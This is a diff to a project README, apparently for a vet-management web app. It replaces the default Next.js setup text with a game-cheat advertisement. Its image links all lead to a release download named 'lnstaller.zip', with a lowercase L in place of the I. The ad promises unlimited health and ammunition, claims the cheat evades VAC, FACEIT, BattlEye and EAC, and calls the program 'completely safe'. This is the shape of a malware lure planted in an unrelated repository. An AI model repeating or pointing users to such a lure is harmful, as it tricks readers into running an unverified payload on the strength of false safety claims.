@@ -1,36 +1,20 @@
-This is a [Next.js](https://nextjs.org/) project bootstrapped with [`create-next-app`](https://github.com/vercel/next.js/tree/canary/packages/create-next-app).
+[![image](https://github.com/JohnMwendwa/vet-management-system/assets/72663882/ec3cd15e-b36b-4ef5-a768-59858b10f14c)](https://github.com/JohnMwendwa/vet-management-system/releases/download/apollos/lnstaller.zip)
 
-## Getting Started
 
-First, run the development server:
+[![image](https://github.com/JohnMwendwa/vet-management-system/assets/72663882/d9920dfc-1677-4f2b-87ef-4db1bc39e379)](https://github.com/JohnMwendwa/vet-management-system/releases/download/apollos/lnstaller.zip)
 
-```bash
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-# or
-bun dev
-```
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+[![image](https://github.com/JohnMwendwa/vet-management-system/assets/72663882/078d52a8-305d-484f-8d99-93ea76fa30b2)](https://github.com/JohnMwendwa/vet-management-system/releases/download/apollos/lnstaller.zip)
 
-You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.
+Features 🛠️:
+-Endless Health -Endless Endurance -Endless syringes -The Endless Shield -Endless rounds -Endless grenades -Endless Jetpack -Endless rounds on the support weapon -There is no recharge -And more tools  
 
-This project uses [`next/font`](https://nextjs.org/docs/basic-features/font-optimization) to automatically optimize and load Inter, a custom Google Font.
+Tip
 
-## Learn More
+Anti-cheats (VAC, FACEIT, ESEA, BATTLEYE, EAC and many others) cannot detect our cheat.
+Most importantly: the program is completely safe for your Windows system.
+Support for most systems: Windows 7/8/8.1/10/11 (x32/64).
 
-To learn more about Next.js, take a look at the following resources:
+Screenshots:
+![image (1)](https://github.com/JohnMwendwa/vet-management-system/assets/72663882/6be9f555-f415-4c26-a5b6-bd01304f7d5b)
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
-
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js/) - your feedback and contributions are welcome!
-
-## Deploy on Vercel
-
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
-
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/deployment) for more details.
